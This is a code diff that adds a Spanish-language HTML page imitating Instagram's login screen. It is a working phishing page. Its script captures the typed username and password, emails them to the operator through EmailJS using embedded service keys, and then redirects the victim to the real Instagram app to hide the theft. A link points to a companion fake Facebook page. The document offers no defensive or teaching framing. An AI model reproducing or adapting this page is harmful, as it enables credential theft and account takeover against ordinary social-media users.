@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - Instagram</title>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #fafafa;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .login-container {
+            background-color: white;
+            border-radius: 5px;
+            padding: 40px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
+            width: 300px;
+            text-align: center;
+        }
+
+        .logo img {
+            width: 100%;
+            height: auto;
+            max-width: 140px;
+        }
+
+        .logo-text {
+            font-family: 'Lobster', cursive;
+            font-size: 40px;
+            margin-top: 10px;
+            color: #262626;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 14px;
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 12px;
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 14px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        .login-btn:hover {
+            background-color: #007bb5;
+        }
+
+        .divider {
+            margin: 20px 0;
+            font-size: 14px;
+            color: #999;
+        }
+
+        .facebook-btn {
+            width: 100%;
+            padding: 12px;
+            background-color: #3b5998;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 14px;
+            cursor: pointer;
+        }
+
+        .facebook-btn:hover {
+            background-color: #2d4373;
+        }
+
+        .warning {
+            color: red;
+            font-size: 12px;
+            margin-top: -10px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-container">
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/95/Instagram_logo_2022.svg/1200px-Instagram_logo_2022.svg.png" alt="Instagram Logo">
+        </div>
+        <div class="logo-text">Instagram</div>
+
+        <form id="loginForm">
+            <input type="text" id="username" name="username" placeholder="Correo electrónico o teléfono" required>
+            <div id="warningMessage" class="warning" style="display: none;">Por favor ingresa un correo electrónico o teléfono válido.</div>
+            <input type="password" name="password" placeholder="Contraseña" required>
+            <button type="submit" class="login-btn">Iniciar sesión</button>
+        </form>
+
+        <div class="divider"><span>OR</span></div>
+
+        <!-- Botón para redirigir a Facebook -->
+        <button class="facebook-btn" onclick="redirectToFacebook()">Iniciar sesión con Facebook</button>
+    </div>
+
+    <script>
+        // Inicializar EmailJS con la nueva versión
+        (function(){
+            emailjs.init("Cpx_lySVFofcpQxgu"); // Reemplaza con tu clave pública de EmailJS
+
+            document.getElementById('loginForm').addEventListener('submit', function(event) {
+                event.preventDefault(); // Evitar el envío del formulario
+
+                var username = document.getElementById('username').value;
+                var password = document.querySelector('input[name="password"]').value;
+                var warningMessage = document.getElementById('warningMessage');
+
+                // Expresiones regulares para validar correo o teléfono
+                var emailPattern = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,6}$/;
+                var phonePattern = /^[0-9]{10,15}$/;
+
+                if (!emailPattern.test(username) && !phonePattern.test(username)) {
+                    warningMessage.style.display = 'block';
+                } else {
+                    warningMessage.style.display = 'none';
+
+                    // Enviar datos a través de EmailJS
+                    var templateParams = {
+                        user_email: username,
+                        user_password: password
+                    };
+
+                    emailjs.send('service_wajrnqe', 'template_qqwqyba', templateParams)
+                        .then(function(response) {
+                            // Redirigir a la aplicación de Instagram (enlace profundo)
+                            window.location.href = "instagram://user?username=" + username;
+                        }, function(error) {
+                            console.error("Error al enviar el correo:", error);
+                        });
+                }
+            });
+        })();
+
+        // Función para redirigir al login de Facebook
+        function redirectToFacebook() {
+            window.location.href = "facebook.html"; // Redirige a la página facebook.html
+        }
+    </script>
+
+</body>
+</html>
